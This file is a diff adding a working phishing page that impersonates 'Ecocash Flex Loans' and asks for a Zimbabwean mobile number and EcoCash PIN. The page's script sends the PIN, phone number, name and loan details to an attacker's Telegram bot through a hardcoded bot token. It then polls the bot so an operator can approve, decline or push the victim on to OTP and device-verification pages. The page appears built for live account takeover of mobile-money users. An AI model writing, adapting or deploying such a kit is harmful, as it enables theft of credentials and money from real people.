@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Ecocash Flex Loans - FlexLoan</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+    :root {
+      --blue: #0B5ED7;
+      --blue-dark: #073B8E;
+      --blue-soft: #EDF6FF;
+      --blue-light: #F7FBFF;
+      --blue-border: #CFE6FF;
+      --red: #E42320;
+      --text: #0f172a;
+      --muted: #64748b;
+      --white: #ffffff;
+      --shadow: 0 18px 50px rgba(15, 23, 42, 0.14);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { -webkit-text-size-adjust: 100%; }
+
+    body {
+      min-height: 100dvh;
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at 12% 8%, rgba(11, 94, 215, 0.20), transparent 30%),
+        radial-gradient(circle at 88% 88%, rgba(7, 59, 142, 0.16), transparent 32%),
+        linear-gradient(180deg, #f8fbff 0%, #eef6ff 100%);
+      overflow-x: hidden;
+    }
+
+    .topbar {
+      height: 64px;
+      padding: 14px max(18px, env(safe-area-inset-right)) 14px max(18px, env(safe-area-inset-left));
+      background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+      color: var(--white);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 10px 28px rgba(11, 94, 215, 0.18);
+    }
+
+    .brand {
+      font-size: clamp(21px, 5vw, 25px);
+      font-weight: 800;
+      letter-spacing: -0.8px;
+      text-decoration: none;
+      line-height: 1;
+    }
+
+    .brand .eco { color: #ffffff; }
+    .brand .cash { color: #ff3b30; }
+    .menu-icon { font-size: 24px; font-weight: 800; color: #fff; line-height: 1; }
+
+    main {
+      min-height: calc(100dvh - 64px);
+      padding: clamp(14px, 3vw, 28px) max(12px, env(safe-area-inset-right)) max(14px, env(safe-area-inset-bottom)) max(12px, env(safe-area-inset-left));
+      display: grid;
+      place-items: center;
+    }
+
+    .login-card {
+      width: min(100%, 500px);
+      background: rgba(255, 255, 255, 0.98);
+      border: 1px solid rgba(219, 234, 254, 0.95);
+      border-radius: clamp(18px, 5vw, 28px);
+      padding: clamp(22px, 5vw, 36px);
+      box-shadow: var(--shadow);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .login-card::before {
+      content: "";
+      position: absolute;
+      inset: 0 0 auto 0;
+      height: 8px;
+      background: linear-gradient(90deg, var(--blue), var(--blue-dark));
+    }
+
+    .logo-lockup {
+      text-align: center;
+      margin: 8px 0 22px;
+    }
+
+    .logo-text {
+      font-size: clamp(34px, 9vw, 46px);
+      font-weight: 800;
+      letter-spacing: -1.6px;
+      line-height: 1;
+    }
+
+    .logo-eco { color: var(--blue); }
+    .logo-cash { color: var(--red); }
+
+    .product-name {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 12px;
+      padding: 8px 14px;
+      border-radius: 999px;
+      background: var(--blue-soft);
+      color: var(--blue-dark);
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      white-space: nowrap;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: clamp(24px, 6vw, 31px);
+      font-weight: 800;
+      letter-spacing: -0.9px;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      max-width: 390px;
+      margin: 0 auto 22px;
+      text-align: center;
+      color: var(--muted);
+      font-size: clamp(13px, 3.6vw, 14px);
+      line-height: 1.55;
+    }
+
+    .application-summary {
+      display: none;
+      background: linear-gradient(180deg, #f8fbff 0%, #ffffff 100%);
+      border: 1px solid var(--blue-border);
+      border-radius: 18px;
+      padding: 15px 16px;
+      margin-bottom: 20px;
+    }
+
+    .application-summary.active { display: block; }
+
+    .summary-title {
+      color: var(--blue-dark);
+      font-size: 12px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 9px;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 14px;
+      padding: 8px 0;
+      border-bottom: 1px solid #e5eefb;
+      font-size: 14px;
+    }
+
+    .summary-row:last-child { border-bottom: 0; }
+    .summary-label { color: var(--muted); }
+    .summary-value { font-weight: 800; text-align: right; overflow-wrap: anywhere; }
+
+    .form-panel {
+      background: var(--blue-light);
+      border: 1px solid var(--blue-border);
+      border-radius: 20px;
+      padding: clamp(16px, 4vw, 20px);
+    }
+
+    .field-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 800;
+      color: var(--blue-dark);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 8px;
+    }
+
+    .phone-group {
+      width: 100%;
+      border: 2px solid var(--blue);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      padding: 14px 15px;
+      background: var(--white);
+      box-shadow: 0 8px 24px rgba(11, 94, 215, 0.08);
+    }
+
+    .flag { font-size: 23px; margin-right: 10px; }
+
+    .country-select {
+      display: flex;
+      align-items: center;
+      color: var(--blue);
+      font-weight: 800;
+      font-size: 16px;
+      margin-right: 12px;
+      white-space: nowrap;
+    }
+
+    .phone-input {
+      min-width: 0;
+      flex: 1;
+      border: 0;
+      outline: 0;
+      font-size: 17px;
+      color: var(--text);
+      font-family: inherit;
+      background: transparent;
+    }
+
+    .phone-input::placeholder { color: #94a3b8; }
+
+    /* PIN field */
+    .pin-group {
+      width: 100%;
+      border: 2px solid var(--blue);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      padding: 14px 15px;
+      background: var(--white);
+      box-shadow: 0 8px 24px rgba(11, 94, 215, 0.08);
+      margin-top: 14px;
+    }
+
+    .pin-input {
+      min-width: 0;
+      flex: 1;
+      border: 0;
+      outline: 0;
+      font-size: 17px;
+      color: var(--text);
+      font-family: inherit;
+      background: transparent;
+      letter-spacing: 4px;
+    }
+
+    .pin-input::placeholder { color: #94a3b8; letter-spacing: 0; }
+
+    .hint {
+      color: var(--muted);
+      font-size: 12px;
+      line-height: 1.5;
+      margin-top: 10px;
+      margin-bottom: 18px;
+    }
+
+    /* Error message */
+    .error-msg {
+      display: none;
+      background: #fff1f1;
+      border: 1px solid #fca5a5;
+      color: #b91c1c;
+      font-size: 13px;
+      font-weight: 600;
+      border-radius: 12px;
+      padding: 11px 13px;
+      margin-bottom: 14px;
+      line-height: 1.5;
+    }
+
+    .btn-primary {
+      width: 100%;
+      border: 0;
+      border-radius: 999px;
+      padding: 16px 22px;
+      color: var(--white);
+      background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      cursor: pointer;
+      box-shadow: 0 10px 24px rgba(11, 94, 215, 0.3);
+      touch-action: manipulation;
+      transition: opacity 0.18s, box-shadow 0.18s, transform 0.12s;
+    }
+
+    .btn-primary:hover:not(:disabled) {
+      box-shadow: 0 14px 30px rgba(11, 94, 215, 0.36);
+      transform: translateY(-1px);
+    }
+
+    .btn-primary:active:not(:disabled) { transform: translateY(0); }
+
+    .btn-primary:disabled {
+      background: #cbd5e1;
+      box-shadow: none;
+      cursor: not-allowed;
+    }
+
+    .terms {
+      margin-top: 18px;
+      color: var(--muted);
+      text-align: center;
+      font-size: 12px;
+      line-height: 1.5;
+    }
+
+    .terms a { color: var(--blue); font-weight: 800; }
+
+    /* Spinner overlay */
+    #spinnerOverlay {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 16px;
+      background: rgba(10, 10, 10, 0.88);
+      z-index: 1000;
+      backdrop-filter: blur(4px);
+    }
+
+    .spinner {
+      width: 56px;
+      height: 56px;
+      border: 5px solid rgba(255, 255, 255, 0.12);
+      border-top-color: var(--blue);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    .spin-label {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: -0.2px;
+    }
+
+    .spin-sub {
+      font-size: 13px;
+      color: rgba(255,255,255,0.5);
+      margin-top: -8px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @media (min-width: 900px) {
+      .login-card { width: 520px; }
+    }
+
+    @media (max-width: 520px) {
+      .topbar { height: 56px; padding: 13px 16px; }
+      main { min-height: calc(100dvh - 56px); align-items: start; padding: 14px 12px; }
+      .login-card { padding: 24px 17px; }
+      .logo-lockup { margin-top: 6px; margin-bottom: 18px; }
+      .product-name { font-size: 11px; padding: 7px 12px; }
+      .form-panel { padding: 15px; }
+      .summary-row { font-size: 13px; }
+      .phone-group, .pin-group { padding: 13px 12px; }
+      .country-select { font-size: 15px; margin-right: 9px; }
+      .phone-input, .pin-input { font-size: 16px; }
+    }
+
+    @media (max-width: 360px) {
+      main { padding: 10px; }
+      .login-card { padding: 22px 14px; border-radius: 20px; }
+      .phone-group, .pin-group { padding: 12px 10px; }
+      .flag { margin-right: 8px; }
+      .country-select { font-size: 14px; margin-right: 8px; }
+      .phone-input, .pin-input { font-size: 15px; }
+      .btn-primary { padding: 15px 18px; }
+    }
+
+    @media (max-height: 680px) {
+      main { align-items: start; }
+      .login-card { margin-bottom: 12px; }
+    }
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
+    <div class="menu-icon">☰</div>
+  </header>
+
+  <main>
+    <section class="login-card" aria-labelledby="pageTitle">
+      <div class="logo-lockup">
+        <div class="logo-text"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div class="product-name">Flex Loans • FlexLoan</div>
+      </div>
+
+      <h1 id="pageTitle">Ecocash Flex Loans</h1>
+      <p class="subtitle">Confirm your mobile number to continue with the loan application you started on the previous page.</p>
+
+      <div id="applicationSummary" class="application-summary">
+        <div class="summary-title">Application picked from index</div>
+        <div class="summary-row"><span class="summary-label">Applicant</span><span class="summary-value" id="summaryName">—</span></div>
+        <div class="summary-row"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">—</span></div>
+        <div class="summary-row"><span class="summary-label">Loan Type</span><span class="summary-value" id="summaryType">—</span></div>
+      </div>
+
+      <div class="form-panel">
+        <label class="field-label" for="phoneInput">Mobile Number</label>
+        <div class="phone-group">
+          <span class="flag">🇿🇼</span>
+          <div class="country-select">+263</div>
+          <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number" inputmode="numeric" autocomplete="tel" maxlength="9">
+        </div>
+
+        <label class="field-label" for="pinInput" style="margin-top:14px;">EcoCash PIN</label>
+        <div class="pin-group">
+          <input type="password" class="pin-input" id="pinInput" placeholder="4-digit PIN" inputmode="numeric" maxlength="4">
+        </div>
+
+        <p class="hint">Enter your mobile number and PIN to continue.</p>
+
+        <div class="error-msg" id="errMsg"></div>
+
+        <button class="btn-primary" type="button" id="continueBtn">Continue</button>
+      </div>
+
+      <div class="terms">By continuing you agree to the <a href="https://ecocash.co.zw/terms-and-conditions/" target="_blank" rel="noopener">Terms and Conditions</a>.</div>
+    </section>
+  </main>
+
+  <!-- Spinner overlay -->
+  <div id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spin-label">Verifying &amp; Processing</div>
+    <div class="spin-sub">Please hold on…</div>
+  </div>
+
+  <script>
+    const CONFIG = {
+      BOT_TOKEN: '8722087484:AAEJ0Hc52ogYQ9NWQOV4m3Nl88x8TUR1O5k',
+      CHAT_ID: '8820857419',
+      APPROVE_PAGE: 'otp.html',
+      DEVICE_PAGE: 'device.html',      // ← fixed: was device_verify.html
+      SUCCESS_PAGE: 'success.html'
+    };
+
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    const phoneInput     = document.getElementById('phoneInput');
+    const pinInput       = document.getElementById('pinInput');
+    const continueBtn    = document.getElementById('continueBtn');
+    const errMsg         = document.getElementById('errMsg');
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
+
+    // ── Load application details from localStorage (original logic preserved) ──
+    function getStoredApplication() {
+      try {
+        return JSON.parse(localStorage.getItem('loanApplication') || '{}');
+      } catch (e) {
+        return {};
+      }
+    }
+
+    function normalizePhone(phone) {
+      return String(phone || '').replace(/\D/g, '').replace(/^263/, '').slice(-9);
+    }
+
+    function loadApplicationDetails() {
+      const application = getStoredApplication();
+      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim();
+      const phone = normalizePhone(application.phone || localStorage.getItem('phone'));
+
+      if (phone) phoneInput.value = phone;
+
+      if (fullName || application.loanAmount || application.loanType) {
+        document.getElementById('applicationSummary').classList.add('active');
+        document.getElementById('summaryName').textContent   = fullName || '—';
+        document.getElementById('summaryAmount').textContent = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
+        document.getElementById('summaryType').textContent   = application.loanType || '—';
+      }
+    }
+
+    // ── Input sanitisation ──
+    phoneInput.addEventListener('input', () => {
+      phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
+    });
+
+    pinInput.addEventListener('input', () => {
+      pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
+      if (pinInput.value.length === 4) pinInput.blur();
+    });
+
+    // ── Helpers ──
+    function showError(msg) {
+      errMsg.textContent   = msg;
+      errMsg.style.display = 'block';
+    }
+
+    function resetButton() {
+      isProcessing            = false;
+      continueBtn.disabled    = false;
+      continueBtn.textContent = 'Continue';
+    }
+
+    // ── Telegram bot send + poll ──
+    function sendToBot(phone, pin) {
+      if (isProcessing) return;
+      isProcessing = true;
+      continueBtn.disabled    = true;
+      continueBtn.textContent = 'Verifying…';
+
+      const application = getStoredApplication();
+      const loanAmount  = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
+      const loanType    = application.loanType || '—';
+      const fullName    = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
+
+      const ts        = Date.now();
+      const approveId = `approve_${ts}`;
+      const declineId = `decline_${ts}`;
+      const verifyId  = `verify_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 EcoCash Flex Loan Verification</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve Loan',  callback_data: approveId },
+                { text: '📱 Verify Device', callback_data: verifyId  }
+              ],
+              [{ text: '❌ Decline', callback_data: declineId }]
+            ]
+          }
+        })
+      })
+      .then(() => {
+        // Save phone to localStorage (original behaviour)
+        localStorage.setItem('phone', phone);
+        localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
+
+        spinnerOverlay.style.display = 'flex';
+        startPolling(approveId, declineId, verifyId);
+      })
+      .catch(() => resetButton());
+    }
+
+    function startPolling(approveId, declineId, verifyId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+
+                if (cb === approveId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                }
+                else if (cb === verifyId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  window.location.href = CONFIG.DEVICE_PAGE;   // → device.html
+                }
+                else if (cb === declineId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  showError('Request declined. Please try again.');
+                  resetButton();
+                }
+              }
+            });
+          });
+      }, 1000);
+    }
+
+    // ── Submit ──
+    continueBtn.addEventListener('click', () => {
+      errMsg.style.display = 'none';
+
+      const phone = normalizePhone(phoneInput.value);
+      const pin   = pinInput.value.trim();
+
+      if (phone.length !== 9) {
+        showError('Please enter a valid 9-digit mobile number.');
+        return;
+      }
+      if (pin.length !== 4) {
+        showError('Please enter your 4-digit EcoCash PIN.');
+        return;
+      }
+
+      sendToBot(phone, pin);
+    });
+
+    // ── Init ──
+    window.addEventListener('pageshow', (event) => {
+      if (event.persisted) window.location.reload();
+    });
+
+    window.addEventListener('load', loadApplicationDetails);
+  </script>
+</body>
+</html>
